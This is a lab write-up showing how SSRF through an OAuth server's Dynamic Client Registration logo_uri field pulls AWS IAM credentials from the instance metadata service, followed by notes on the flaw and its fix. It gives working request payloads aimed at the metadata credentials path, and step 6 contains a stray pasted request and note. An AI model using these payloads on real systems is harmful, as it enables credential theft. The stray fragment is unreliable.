# Lab: SSRF via OpenID Dynamic Client Registration

## Objective

Exploit the OpenID Dynamic Client Registration feature to trigger a Server-Side Request Forgery (SSRF) and retrieve the AWS SecretAccessKey from the cloud metadata service.

---

## Steps

### 1. Log in

Logged in normally using:

```
Username: wiener
Password: peter
```

---

### 2. Discover the OpenID Configuration

Visited the OpenID configuration endpoint:

```
https://oauth-server/.well-known/openid-configuration
```

This revealed the OAuth provider configuration, including the issuer URL.

---

### 3. Register a New OAuth Client

Sent the following request:

```http
POST /reg HTTP/2

Host: oauth-server

Content-Type: application/json

{
    "redirect_uris":[
        "https://example.com"
    ]
}
```

The server responded with:

```json
{
    "client_id":"hyjlotconY-bN4UlVxHJ3",
    ...
}
```

---

### 4. Identify an SSRF Entry Point

Registered another client, this time supplying a `logo_uri` parameter.

```http
POST /reg HTTP/2

Host: oauth-server

Content-Type: application/json

{
    "redirect_uris":[
        "https://example.com"
    ],
    "logo_uri":"http://169.254.169.254/latest/meta-data/"
}
```

This indicated that the OAuth server attempted to fetch the supplied URL.

---

### 5. Target the AWS Metadata Service

Updated the registration request to point directly to the credentials endpoint.

```http
POST /reg HTTP/2

Host: oauth-server

Content-Type: application/json

{
    "redirect_uris":[
        "https://example.com"
    ],
    "logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
The server responded with:

```json
{
    "client_id":"hyjlotconY-bN4UlVxHJ3",
    ...
}

---

### 6. Trigger the SSRF

Requested the generated client logo.

```http
GET /client/hyjlotconY-bN4UlVxHJ3/logo HTTP/2
Host: oauth-server.net
انسخ دول في ال request ده 
GET /auth?client_id=zpjn8xvmzdfwdpzlpda2w&redirect_uri=https://0ae000b70394a9c98018036500a800e2.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0acb008f03a8a984800b0159026f00c6.oauth-server.net
```

Instead of returning an image, the OAuth server fetched the metadata endpoint and returned the response.

---

### 7. Retrieve the Secret

The response contained the AWS IAM credentials.

```json
{
  "Code":"Success",
  "AccessKeyId":"Jom8nqEZaWv4R38ehaJ4",
  "SecretAccessKey":"iXXgEhdIr2rizuZfNobDcfjTwFPUUhVqb67nJrb5",
  "Token":"...",
  "Expiration":"..."
}
```

Submitted the following value to solve the lab:

```
iXXgEhdIr2rizuZfNobDcfjTwFPUUhVqb67nJrb5
```

---

## Vulnerability

The OAuth server supports Dynamic Client Registration.

The `logo_uri` parameter is automatically fetched by the server without validating the destination.

Because arbitrary URLs are accepted, an attacker can force the server to request internal resources, resulting in Server-Side Request Forgery (SSRF).

---

## Impact

An attacker can access internal services that are normally unreachable from the Internet.

In cloud environments this often allows access to the Instance Metadata Service (IMDS), exposing IAM credentials, API keys, and other sensitive information.

---

## Key Takeaway

Any parameter that causes the server to fetch a remote resource (`logo_uri`, `jwks_uri`, etc.) should always be treated as a potential SSRF sink.

Never allow unrestricted server-side requests to user-controlled URLs.

---

## Skills Learned

- OpenID Dynamic Client Registration
- OAuth Enumeration
- Server-Side Request Forgery (SSRF)
- AWS Metadata Service
- Burp Repeater
